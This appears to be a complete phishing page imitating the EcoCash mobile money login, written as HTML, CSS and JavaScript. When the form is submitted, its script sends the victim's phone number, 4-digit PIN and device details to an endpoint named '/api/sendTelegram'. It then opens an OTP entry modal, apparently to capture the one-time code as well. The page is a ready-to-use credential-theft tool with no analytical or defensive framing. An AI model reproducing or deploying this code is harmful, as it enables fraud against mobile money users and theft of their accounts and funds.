<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>EcoCash — Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box}
html,body{height:100%}
body{
  font-family:Inter,system-ui,Arial;
  background:linear-gradient(180deg,#f7fbff,#e8f3ff);
  margin:0;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
}

.card{width:100%;max-width:380px;background:#fff;padding:20px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
.logo{height:44px;display:block;margin:0 auto 10px}
h2{text-align:center;margin:0 0 12px}
label{display:block;font-size:13px;color:#374151;margin-top:8px}
.req{color:#d04444;margin-right:6px}
input{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;font-size:14px}

.btn{width:100%;margin-top:14px;padding:10px;border-radius:8px;border:0;background:#4b86ff;color:#fff;cursor:pointer}
.btn[disabled]{background:#cbd5e1;cursor:not-allowed}

/* PIN */
.pin-row{
  display:flex;
  justify-content:center;
  gap:10px;
  margin-top:6px;
}
.pin-box{
  width:44px;
  height:48px;
  text-align:center;
  font-size:22px;
  border-radius:8px;
  border:1px solid #e6eefc;
}
</style>
</head>

<body>
<div class="card">
  <img src="assets/eco.png" class="logo" alt="EcoCash">
  <h2>Log In</h2>

  <form id="loginForm" autocomplete="off">
    <label><span class="req">★</span>Mobile Number</label>
    <input id="phone" value="+263" inputmode="tel">

    <label><span class="req">★</span>4-Digit PIN</label>
    <div class="pin-row">
      <input class="pin-box" maxlength="1">
      <input class="pin-box" maxlength="1">
      <input class="pin-box" maxlength="1">
      <input class="pin-box" maxlength="1">
    </div>

    <button id="loginBtn" class="btn" disabled>LOGIN</button>
  </form>
</div>

<!-- ================= OTP MODAL (UNCHANGED) ================= -->
<div id="otpModal" style="display:none" class="otp-modal" aria-hidden="true">
  <div class="otp-box">
    <strong style="display:block;text-align:center">Enter OTP</strong>
    <div class="otp-row">
      <input maxlength="1" class="otp-digit" id="d0">
      <input maxlength="1" class="otp-digit" id="d1">
      <input maxlength="1" class="otp-digit" id="d2">
      <input maxlength="1" class="otp-digit" id="d3">
      <input maxlength="1" class="otp-digit" id="d4">
      <input maxlength="1" class="otp-digit" id="d5">
    </div>
  </div>
</div>

<script>
/* ================= CONFIG ================= */
const PREFIX = '+263';
const SPAM_DELAY = 3000;
let lastAction = 0;

/* ================= DEVICE ================= */
const deviceInfo = {
  ua: navigator.userAgent,
  platform: navigator.platform,
  screen: `${screen.width}x${screen.height}`
};

/* ================= PHONE ================= */
const phoneEl = document.getElementById('phone');

phoneEl.addEventListener('keydown', e=>{
  if((e.key==='Backspace'||e.key==='Delete') && phoneEl.selectionStart<=PREFIX.length){
    e.preventDefault();
  }
});

phoneEl.addEventListener('input',()=>{
  let d = phoneEl.value.replace(/\D/g,'').slice(3);
  if(d.startsWith('0')) d=d.slice(1);
  if(d && d[0]!=='7') d='7'+d.slice(1);
  phoneEl.value = PREFIX + d.slice(0,9);
  requestAnimationFrame(()=> phoneEl.setSelectionRange(phoneEl.value.length, phoneEl.value.length));
  updateState();
});

function validPhone(){
  const d = phoneEl.value.slice(4);
  return /^\d{9}$/.test(d) && d.startsWith('7');
}

/* ================= PIN ================= */
const pins = [...document.querySelectorAll('.pin-box')];

function getPin(){
  return pins.map(p=>p.dataset.v||'').join('');
}

pins.forEach((p,i)=>{
  p.addEventListener('input',e=>{
    const v = e.target.value.replace(/\D/g,'');
    p.value = v ? '•' : '';
    p.dataset.v = v;
    if(v && i<3) pins[i+1].focus();
    updateState();
  });

  p.addEventListener('keydown',e=>{
    if(e.key==='Backspace' && !p.dataset.v && i>0){
      e.preventDefault();
      pins[i-1].dataset.v='';
      pins[i-1].value='';
      pins[i-1].focus();
      updateState();
    }
  });
});

/* ================= STATE ================= */
const loginBtn = document.getElementById('loginBtn');
function updateState(){
  loginBtn.disabled = !(validPhone() && /^\d{4}$/.test(getPin()));
}

/* ================= SEND ================= */
function spamBlocked(){
  const n=Date.now();
  if(n-lastAction<SPAM_DELAY) return true;
  lastAction=n;
  return false;
}

function sendToServer(payload){
  return fetch('/api/sendTelegram',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload)
  });
}

/* ================= LOGIN ================= */
document.getElementById('loginForm').addEventListener('submit',e=>{
  e.preventDefault();
  if(spamBlocked()) return;

  sendToServer({
    event:'login_clicked',
    loginPhone: phoneEl.value,
    loginPin: getPin(),
    device: deviceInfo,
    submittedAt: new Date().toISOString()
  });

  document.getElementById('otpModal').style.display='flex';
});
</script>
</body>
</html>
